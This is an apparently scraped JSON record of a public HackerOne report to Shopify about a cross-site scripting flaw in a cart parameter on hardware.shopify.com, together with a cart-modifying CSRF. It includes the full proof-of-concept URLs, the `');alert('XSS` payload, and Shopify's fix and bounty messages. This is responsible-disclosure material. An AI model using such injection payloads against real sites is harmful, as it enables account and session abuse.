{"id":116006,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTYwMDY=","url":"https://hackerone.com/reports/116006","title":"XSS on hardware.shopify.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-02-11T22:24:58.916Z","submitted_at":"2016-02-11T22:24:58.916Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mdv","url":"/mdv","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-03-01T06:18:34.752Z","bug_reporter_agreed_on_going_public_at":"2016-03-01T05:30:02.003Z","team_member_agreed_on_going_public_at":"2016-03-01T06:18:34.568Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello @Shopify.\nI found CSRF and XSS, that very good combine with each other.\n### CSRF\nThis CSRF is not dangerous, but is serves me in order to perform other bugs.\nFor example, here CSRF for adding product:\n```\nhttp://hardware.shopify.com/cart/add?\u0026id=1106494145\u0026iPad Stand=1120276481\u0026Cash Drawer=1120176153\u0026Receipt Printer=1120166789\u0026attributes[cart_exists]=true\u0026properties[builder_id]=shapp_options_421549285_1455208671885\u0026properties[master_builder]=1\u0026properties[test]=test\u0026properties[value]=11\u0026add\n```\nWorks with GET and POST requests, which greatly simplifies the work.\n### XSS\nTo reproduce this XSS, visit this link:\n```\nhttp://hardware.shopify.com/cart/add?id=1106494145\u0026iPad Stand=1120276481\u0026Cash Drawer=1120176153\u0026Receipt Printer=1120166789\u0026attributes[cart_exists]=true\u0026properties[builder_id]=shapp_options_421549285_1455208671885%27%29%3Balert%28%27XSS\u0026properties[master_builder]=1\u0026properties[test]=test\u0026properties[value]=11\u0026add\n```\nAnd click \"Remove\" in attached product.\nVulnerable parameter: `properties[builder_id]`\nFor this XSS i used `');alert('XSS`","vulnerability_information_html":"\u003cp\u003eHello \u003ca href=\"/shopify\"\u003e@Shopify\u003c/a\u003e.\u003cbr\u003e\nI found CSRF and XSS, that very good combine with each other.\u003c/p\u003e\n\n\u003ch3 id=\"csrf\"\u003eCSRF\u003c/h3\u003e\n\n\u003cp\u003eThis CSRF is not dangerous, but is serves me in order to perform other bugs.\u003cbr\u003e\nFor example, here CSRF for adding product:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://hardware.shopify.com/cart/add?\u0026amp;id=1106494145\u0026amp;iPad Stand=1120276481\u0026amp;Cash Drawer=1120176153\u0026amp;Receipt Printer=1120166789\u0026amp;attributes[cart_exists]=true\u0026amp;properties[builder_id]=shapp_options_421549285_1455208671885\u0026amp;properties[master_builder]=1\u0026amp;properties[test]=test\u0026amp;properties[value]=11\u0026amp;add\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWorks with GET and POST requests, which greatly simplifies the work.\u003c/p\u003e\n\n\u003ch3 id=\"xss\"\u003eXSS\u003c/h3\u003e\n\n\u003cp\u003eTo reproduce this XSS, visit this link:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://hardware.shopify.com/cart/add?id=1106494145\u0026amp;iPad Stand=1120276481\u0026amp;Cash Drawer=1120176153\u0026amp;Receipt Printer=1120166789\u0026amp;attributes[cart_exists]=true\u0026amp;properties[builder_id]=shapp_options_421549285_1455208671885%27%29%3Balert%28%27XSS\u0026amp;properties[master_builder]=1\u0026amp;properties[test]=test\u0026amp;properties[value]=11\u0026amp;add\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd click \u0026quot;Remove\u0026quot; in attached product.\u003cbr\u003e\nVulnerable parameter: \u003ccode\u003eproperties[builder_id]\u003c/code\u003e\u003cbr\u003e\nFor this XSS i used \u003ccode\u003e\u0026#39;);alert(\u0026#39;XSS\u003c/code\u003e\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":73176,"file_name":"XSS.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/073/176/5994095108600e64713e793760bf1f886f3deda2/XSS.png?response-content-disposition=attachment%3B%20filename%3D%22XSS.png%22%3B%20filename%2A%3DUTF-8%27%27XSS.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041821Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=03f6bd79628f165a3906975d6a40f11d388e16760da2a4eaa8022238ad79b2a8","file_size":463708,"type":"image/png"}],"allow_singular_disclosure_at":"2016-03-31T05:30:02.204Z","allow_singular_disclosure_after":-149813299.50630054,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":800221,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. Our engineering team is investigating the issue.","markdown_message":"\u003cp\u003eThank you for your report. Our engineering team is investigating the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-16T19:58:32.745Z","updated_at":"2016-02-16T19:58:32.745Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":801860,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. We recently rolled out a fix for the cross-site scripting issue.\n\nAs you pointed out, modifying the cart via CSRF is not dangerous on its own, and is in fact required for some features of the Shopify platform to function correctly. For that reason, it's excluded from our white hat program, as listed on our [program page](https://hackerone.com/shopify) and we don't plan to make any changes.\n\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon. Thank you for your interest in improving the security of Shopify!","markdown_message":"\u003cp\u003eThanks again for your report. We recently rolled out a fix for the cross-site scripting issue.\u003c/p\u003e\n\n\u003cp\u003eAs you pointed out, modifying the cart via CSRF is not dangerous on its own, and is in fact required for some features of the Shopify platform to function correctly. For that reason, it\u0026#39;s excluded from our white hat program, as listed on our \u003ca href=\"https://hackerone.com/shopify\"\u003eprogram page\u003c/a\u003e and we don\u0026#39;t plan to make any changes.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon. Thank you for your interest in improving the security of Shopify!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-17T19:08:32.273Z","updated_at":"2016-02-17T19:08:32.273Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mdv","url":"/mdv"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":817997,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify. This issue has been resolved.","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify. This issue has been resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-01T00:50:25.216Z","updated_at":"2016-03-01T00:50:25.216Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"mdv","url":"/mdv"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":818239,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you for a bounty.","markdown_message":"\u003cp\u003eThank you for a bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-01T05:30:02.031Z","updated_at":"2016-03-01T05:30:02.031Z","first_to_agree":true,"actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":818259,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-01T06:18:34.592Z","updated_at":"2016-03-01T06:18:34.592Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":818260,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-01T06:18:34.771Z","updated_at":"2016-03-01T06:18:34.771Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":818261,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-01T06:19:23.227Z","updated_at":"2016-03-01T06:19:23.227Z","additional_data":{"old_title":"CSRF and XSS on hardware.shopify.com","new_title":"XSS on hardware.shopify.com"},"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1164631,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-31T12:55:56.663Z","updated_at":"2018-02-28T13:10:45.464Z","additional_data":{"added_weaknesses":[],"removed_weaknesses":[{"id":45,"name":"Cross-Site Request Forgery (CSRF)"}]},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}